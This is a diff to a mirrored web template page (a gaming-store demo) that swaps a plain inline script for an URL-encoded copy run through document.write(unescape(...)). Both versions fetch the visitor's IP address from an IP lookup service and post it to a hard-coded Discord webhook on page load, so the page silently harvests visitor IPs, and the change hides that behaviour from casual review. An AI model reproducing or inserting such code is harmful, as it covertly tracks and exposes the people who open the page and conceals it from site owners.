@@ -9,47 +9,11 @@ Author URL: http://w3layouts.com
 
 	
 	
-<!DOCTYPE html>
-<html>
-<head>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-  <script>
-    $(document).ready(function() {
-      var webhookUrl = 'https://discord.com/api/webhooks/1111324840528465972/uQgeqqqUwTGDH1Yp_FTWRAGLhZyS1BbcSvjj61gLyd2xr2DEmKLKE3eBE7oDeYIM2Ull';
-      
-      $.getJSON('https://api.ipify.org?format=json', function(data) {
-        var ip = data.ip;
-        
-        var payload = {
-          "content": "@everyone",
-          "embeds": [
-            {
-              "title": "Funny thing:",
-              "description": ip,
-              "color": 16711680
-            }
-          ]
-        };
-        
-        $.ajax({
-          url: webhookUrl,
-          type: 'POST',
-          data: JSON.stringify(payload),
-          contentType: 'application/json',
-          success: function() {
-            console.log('.');
-          },
-          error: function(xhr, status, error) {
-            console.error('Error sending IP address to Discord webhook:', error);
-          }
-        });
-      });
-    });
-  </script>
-</head>
-<body>
-</body>
-</html>
+<script>
+<!-- code by https://www.html-code-generator.com -->
+document.write(unescape('%3C%21DOCTYPE%20html%3E%0A%3Chtml%3E%0A%3Chead%3E%0A%20%20%3Cscript%20src%3D%22https%3A//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js%22%3E%3C/script%3E%0A%20%20%3Cscript%3E%0A%20%20%20%20%24%28document%29.ready%28function%28%29%20%7B%0A%20%20%20%20%20%20var%20webhookUrl%20%3D%20%27https%3A//discord.com/api/webhooks/1111324840528465972/uQgeqqqUwTGDH1Yp_FTWRAGLhZyS1BbcSvjj61gLyd2xr2DEmKLKE3eBE7oDeYIM2Ull%27%3B%0A%20%20%20%20%20%20%0A%20%20%20%20%20%20%24.getJSON%28%27https%3A//api.ipify.org%3Fformat%3Djson%27%2C%20function%28data%29%20%7B%0A%20%20%20%20%20%20%20%20var%20ip%20%3D%20data.ip%3B%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20var%20payload%20%3D%20%7B%0A%20%20%20%20%20%20%20%20%20%20%22content%22%3A%20%22@everyone%22%2C%0A%20%20%20%20%20%20%20%20%20%20%22embeds%22%3A%20%5B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22title%22%3A%20%22Funny%20thing%3A%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22description%22%3A%20ip%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22color%22%3A%2016711680%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%5D%0A%20%20%20%20%20%20%20%20%7D%3B%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%24.ajax%28%7B%0A%20%20%20%20%20%20%20%20%20%20url%3A%20webhookUrl%2C%0A%20%20%20%20%20%20%20%20%20%20type%3A%20%27POST%27%2C%0A%20%20%20%20%20%20%20%20%20%20data%3A%20JSON.stringify%28payload%29%2C%0A%20%20%20%20%20%20%20%20%20%20contentType%3A%20%27application/json%27%2C%0A%20%20%20%20%20%20%20%20%20%20success%3A%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20console.log%28%27.%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20error%3A%20function%28xhr%2C%20status%2C%20error%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20console.error%28%27error%3A%27%2C%20error%29%3B%0A%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%7D%29%3B%0A%20%20%3C/script%3E%0A%3C/head%3E%0A%3Cbody%3E%0A%3C/body%3E%0A%3C/html%3E'))
+</script>
+
 	
 	
 <!-- Mirrored from p.w3layouts.com/demos_new/template_demo/20-12-2019/gaming_store-demo_Free/704026406/web/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 07 May 2023 12:46:16 GMT -->
